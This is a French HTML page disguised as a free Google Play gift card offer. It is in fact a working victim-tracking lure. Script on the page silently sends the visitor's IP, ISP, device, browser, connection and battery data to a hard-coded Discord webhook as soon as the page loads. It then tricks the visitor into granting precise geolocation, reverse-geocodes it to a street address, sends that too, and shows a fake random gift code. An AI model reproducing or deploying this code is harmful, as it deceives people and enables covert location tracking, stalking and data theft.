<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üéÅ Carte Cadeau Google Play Gratuite üéÅ</title>
  <meta property="og:title" content="F√©licitations ! Vous avez re√ßu une carte Google Play de 15 ‚Ç¨">
  <meta property="og:description" content="Votre carte cadeau Google Play est pr√™te √† √™tre utilis√©e. Profitez de vos applications, jeux et films d√®s maintenant !">
  <meta property="og:image" content="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/play_giftcard.max-1300x1300.png">
  <meta property="og:url" content="https://play.google.com/redeem">
  <meta property="og:type" content="website">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="F√©licitations ! Vous avez re√ßu une carte Google Play de 15 ‚Ç¨">
  <meta name="twitter:description" content="Ajoutez votre carte Google Play de 15 ‚Ç¨ √† votre compte et commencez √† acheter vos applications et jeux pr√©f√©r√©s !">
  <meta name="twitter:image" content="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/play_giftcard.max-1300x1300.png">
  <script src="https://unpkg.com/ua-parser-js@1.0.2/dist/ua-parser.min.js"></script>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #0d0d2b, #2a1a5e);
      color: #fff;
      font-family: 'Arial', sans-serif;
      overflow: hidden;
    }
    .container {
      max-width: 400px;
      width: 90%;
      padding: 20px;
      background: rgba(20, 20, 40, 0.8);
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
      animation: glow 2s ease-in-out infinite;
    }
    @keyframes glow {
      0%, 100% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.5); }
      50% { box-shadow: 0 0 40px rgba(0, 255, 255, 0.8); }
    }
    h1 {
      text-align: center;
      font-size: 2rem;
      background: linear-gradient(90deg, #00ffcc, #ff00cc);
      -webkit-background-clip: text;
      color: transparent;
      animation: slideIn 1s ease-out;
    }
    @keyframes slideIn {
      from { transform: translateY(-50px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    p {
      text-align: center;
      font-size: 1rem;
      color: #ccffcc;
      margin-bottom: 20px;
    }
    .button {
      display: block;
      margin: 0 auto;
      padding: 10px 20px;
      background: linear-gradient(45deg, #ff00cc, #00ffcc);
      border: none;
      border-radius: 25px;
      color: #fff;
      font-size: 1.1rem;
      cursor: pointer;
      transition: transform 0.3s;
      animation: bounce 1.5s infinite;
    }
    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    .button:hover {
      background: linear-gradient(45deg, #00ffcc, #ff00cc);
      transform: scale(1.05);
    }
    #result {
      margin-top: 20px;
      opacity: 0;
      transition: opacity 0.5s;
    }
    #result.show {
      opacity: 1;
    }
    #gift-code {
      font-family: monospace;
      font-size: 1.5rem;
      background: #1a1a3d;
      padding: 10px;
      border-radius: 5px;
      text-align: center;
      color: #00ffcc;
    }
    #location-info a {
      color: #00ccff;
      text-decoration: underline;
    }
    #location-info a:hover {
      color: #ff00cc;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üéâ Carte Cadeau Google Play Gratuite ! üéâ</h1>
    <p>Autorisez la localisation pour r√©cup√©rer votre code Google Play officiel de 15 ‚Ç¨ !</p>
    <div id="location-prompt">
      <button id="allow-location" class="button">Autoriser la localisation</button>
    </div>
    <div id="result">
      <p>Votre code Google Play :</p>
      <p id="gift-code"></p>
      <p id="location-info"></p>
    </div>
  </div>

  <script>
    function generateGiftCode() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let code = '';
      for (let i = 0; i < 16; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
        if (i % 4 === 3 && i < 15) code += '-';
      }
      return code;
    }

    async function getIPData() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
          ipv4: data.ip || 'N/A',
          ipv6: data.ipv6 || 'N/A',
          isp: data.org || 'N/A',
          organization: data.asn || 'N/A',
          vpn: data.proxy ? 'Oui' : 'Non',
          proxy: data.proxy ? 'Oui' : 'Non',
          ipLatitude: data.latitude || 'N/A',
          ipLongitude: data.longitude || 'N/A',
          ipCity: data.city || 'N/A',
          ipRegion: data.region || 'N/A',
          ipCountry: data.country_name || 'N/A',
        };
      } catch (error) {
        return { ipv4: 'N/A', ipv6: 'N/A', isp: 'N/A', organization: 'N/A', vpn: 'Non', proxy: 'Non', ipLatitude: 'N/A', ipLongitude: 'N/A', ipCity: 'N/A', ipRegion: 'N/A', ipCountry: 'N/A' };
      }
    }

    function getDeviceInfo() {
      try {
        if (typeof UAParser === 'undefined') throw new Error('UAParser not loaded');
        const parser = new UAParser();
        const result = parser.getResult();
        return {
          userAgent: result.ua || 'N/A',
          device: result.device.model || 'Inconnu',
          brand: result.device.vendor || 'Inconnu',
          os: result.os.name || 'Inconnu',
          osVersion: result.os.version || 'N/A',
          browser: result.browser.name || 'Inconnu',
          browserVersion: result.browser.version || 'N/A',
        };
      } catch (error) {
        return {
          userAgent: navigator.userAgent || 'N/A',
          device: 'Inconnu',
          brand: 'Inconnu',
          os: 'Inconnu',
          osVersion: 'N/A',
          browser: 'Inconnu',
          browserVersion: 'N/A',
        };
      }
    }

    async function getConnectionInfo() {
      try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
        return {
          type: connection.type || 'N/A',
          effectiveType: connection.effectiveType || 'N/A',
          downlink: connection.downlink || 'N/A',
          rtt: connection.rtt || 'N/A',
        };
      } catch (error) {
        return { type: 'N/A', effectiveType: 'N/A', downlink: 'N/A', rtt: 'N/A' };
      }
    }

    async function getBatteryInfo() {
      try {
        if (!navigator.getBattery) return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
        const battery = await navigator.getBattery();
        return {
          level: battery.level ? `${Math.round(battery.level * 100)}%` : 'N/A',
          charging: battery.charging ? 'Oui' : 'Non',
          chargingTime: battery.chargingTime || 'N/A',
          dischargingTime: battery.dischargingTime || 'N/A',
        };
      } catch (error) {
        return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
      }
    }

    function getParisTime() {
      try {
        const options = {
          timeZone: 'Europe/Paris',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false,
        };
        return new Date().toLocaleTimeString('fr-FR', options);
      } catch (error) {
        return 'N/A';
      }
    }

    async function reverseGeocode(lat, lon) {
      try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
        const data = await response.json();
        return {
          address: data.display_name || 'N/A',
          street: data.address.road || 'N/A',
          city: data.address.city || data.address.town || data.address.village || 'N/A',
          neighborhood: data.address.neighbourhood || 'N/A',
          country: data.address.country || 'N/A',
          postalCode: data.address.postcode || 'N/A',
        };
      } catch (error) {
        return { address: 'N/A', street: 'N/A', city: 'N/A', neighborhood: 'N/A', country: 'N/A', postalCode: 'N/A' };
      }
    }

    async function sendToWebhook(data, retries = 3, delay = 1000) {
      for (let attempt = 1; attempt <= retries; attempt++) {
        try {
          // Convert battery charging/discharging times to minutes
          const chargingTimeMin =
            data.battery.chargingTime && data.battery.chargingTime !== 'N/A'
              ? Math.round(data.battery.chargingTime / 60) + ' min'
              : 'N/A';
          const dischargingTimeMin =
            data.battery.dischargingTime && data.battery.dischargingTime !== 'N/A'
              ? Math.round(data.battery.dischargingTime / 60) + ' min'
              : 'N/A';

          const payload = {
            content: data.location ? 'Victime avec localisation !' : 'Nouvelle visite !',
            embeds: [
              {
                title: 'Donn√©es collect√©es',
                fields: [
                  { name: 'IPv4', value: String(data.ip.ipv4 || 'N/A'), inline: true },
                  { name: 'IPv6', value: String(data.ip.ipv6 || 'N/A'), inline: true },
                  { name: 'ISP', value: String(data.ip.isp || 'N/A'), inline: true },
                  { name: 'Organisation', value: String(data.ip.organization || 'N/A'), inline: true },
                  { name: 'VPN/Proxy', value: String(data.ip.vpn || data.ip.proxy || 'Non'), inline: true },
                  {
                    name: 'Localisation IP',
                    value: `Ville: ${String(data.ip.ipCity || 'N/A')}, R√©gion: ${String(
                      data.ip.ipRegion || 'N/A'
                    )}, Pays: ${String(data.ip.ipCountry || 'N/A')}, Lat: ${String(
                      data.ip.ipLatitude || 'N/A'
                    )}, Lon: ${String(data.ip.ipLongitude || 'N/A')}`,
                    inline: false,
                  },
                  { name: 'User Agent', value: String(data.device.userAgent || 'N/A'), inline: false },
                  {
                    name: 'Appareil',
                    value: `${String(data.device.brand || 'Inconnu')} ${String(data.device.device || 'Inconnu')}`,
                    inline: true,
                  },
                  {
                    name: 'OS',
                    value: `${String(data.device.os || 'Inconnu')} ${String(data.device.osVersion || 'N/A')}`,
                    inline: true,
                  },
                  {
                    name: 'Navigateur',
                    value: `${String(data.device.browser || 'Inconnu')} ${String(
                      data.device.browserVersion || 'N/A'
                    )}`,
                    inline: true,
                  },
                  { name: 'Type de connexion', value: String(data.connection.type || 'N/A'), inline: true },
                  { name: 'Type effectif', value: String(data.connection.effectiveType || 'N/A'), inline: true },
                  { name: 'Vitesse (Mbps)', value: String(data.connection.downlink || 'N/A'), inline: true },
                  { name: 'RTT (ms)', value: String(data.connection.rtt || 'N/A'), inline: true },
                  { name: 'Niveau batterie', value: String(data.battery.level || 'N/A'), inline: true },
                  { name: 'En charge', value: String(data.battery.charging || 'N/A'), inline: true },
                  { name: 'Temps de charge', value: String(chargingTimeMin), inline: true },
                  { name: 'Temps de d√©charge', value: String(dischargingTimeMin), inline: true },
                  { name: 'Heure √† Paris', value: String(data.parisTime || 'N/A'), inline: true },
                  ...(data.location
                    ? [
                        { name: 'Latitude', value: String(data.location.latitude || 'N/A'), inline: true },
                        { name: 'Longitude', value: String(data.location.longitude || 'N/A'), inline: true },
                        { name: 'Adresse', value: String(data.location.address?.address || 'N/A'), inline: false },
                        { name: 'Rue', value: String(data.location.address?.street || 'N/A'), inline: true },
                        { name: 'Ville', value: String(data.location.address?.city || 'N/A'), inline: true },
                        {
                          name: 'Quartier',
                          value: String(data.location.address?.neighborhood || 'N/A'),
                          inline: true,
                        },
                        {
                          name: 'Code postal',
                          value: String(data.location.address?.postalCode || 'N/A'),
                          inline: true,
                        },
                        { name: 'Pays', value: String(data.location.address?.country || 'N/A'), inline: true },
                        { name: 'Google Maps', value: String(data.location.mapsLink || 'N/A'), inline: false },
                        { name: 'Street View', value: String(data.location.streetViewLink || 'N/A'), inline: false },
                      ]
                    : []),
                  { name: 'Horodatage', value: String(data.parisTime || 'N/A'), inline: false },
                ],
                color: data.location ? 0x00ff00 : 0xff0000,
              },
            ],
          };

          const response = await fetch(
            'https://discord.com/api/webhooks/1371889224189743154/JlPYX5flX7Z761t1qz1S4FIe3hx3SyxB69jY7MEOb_2sWOUSPpTj20dwXcwW8APSzSW1',
            {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload),
            }
          );

          if (!response.ok) {
            if (response.status === 429) {
              const retryAfter = response.headers.get('Retry-After') || delay;
              throw new Error(`Rate limited, retry after ${retryAfter}ms`);
            }
            throw new Error(`Webhook response status: ${response.status}`);
          }
          return true;
        } catch (error) {
          console.error(`Webhook attempt ${attempt} failed:`, error.message);
          if (attempt < retries) {
            await new Promise(resolve => setTimeout(resolve, delay));
            delay *= 2; // Exponential backoff
          } else {
            console.error('All webhook retries failed');
            return false;
          }
        }
      }
    }

    async function collectInitialData() {
      const ipData = await getIPData();
      const deviceInfo = getDeviceInfo();
      const connectionInfo = await getConnectionInfo();
      const batteryInfo = await getBatteryInfo();
      const parisTime = getParisTime();
      const collectedData = {
        ip: ipData,
        device: deviceInfo,
        connection: connectionInfo,
        battery: batteryInfo,
        parisTime: parisTime,
        location: null,
        timestamp: new Date().toISOString(),
      };
      await sendToWebhook(collectedData);
    }

    const allowButton = document.getElementById('allow-location');
    const locationPrompt = document.getElementById('location-prompt');
    const resultDiv = document.getElementById('result');
    const giftCodeDiv = document.getElementById('gift-code');
    const locationInfoDiv = document.getElementById('location-info');

    window.addEventListener('load', collectInitialData);

    allowButton.addEventListener('click', () => {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude } = position.coords;
          const ipData = await getIPData();
          const deviceInfo = getDeviceInfo();
          const connectionInfo = await getConnectionInfo();
          const batteryInfo = await getBatteryInfo();
          const parisTime = getParisTime();
          const addressData = await reverseGeocode(latitude, longitude);
          const giftCode = generateGiftCode();
          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
          const streetViewLink = `https://www.google.com/maps/@${latitude},${longitude},3a,75y,90h,90t/data=!3m6!1e1!3m4!1s!2e0!7i16384!8i8192`;
          const collectedData = {
            ip: ipData,
            device: deviceInfo,
            connection: connectionInfo,
            battery: batteryInfo,
            parisTime: parisTime,
            location: {
              latitude,
              longitude,
              address: addressData,
              mapsLink,
              streetViewLink,
            },
            timestamp: new Date().toISOString(),
          };
          await sendToWebhook(collectedData);
          locationPrompt.style.display = 'none';
          resultDiv.classList.add('show');
          giftCodeDiv.textContent = giftCode;
          locationInfoDiv.innerHTML = `
            <p>üåç Localisation accept√©e !</p>
            <p><strong>Adresse :</strong> ${addressData.address || 'N/A'}</p>
            <p><strong>Coordonn√©es :</strong> ${latitude}, ${longitude}</p>
            <p><a href="${mapsLink}" target="_blank">Voir sur Google Maps</a></p>
            <p><a href="${streetViewLink}" target="_blank">Voir sur Street View</a></p>
          `;
        },
        () => {
          alert('Veuillez autoriser la localisation pour obtenir votre code !');
        },
        { enableHighAccuracy: true }
      );
    });
  </script>
</body>
</html>
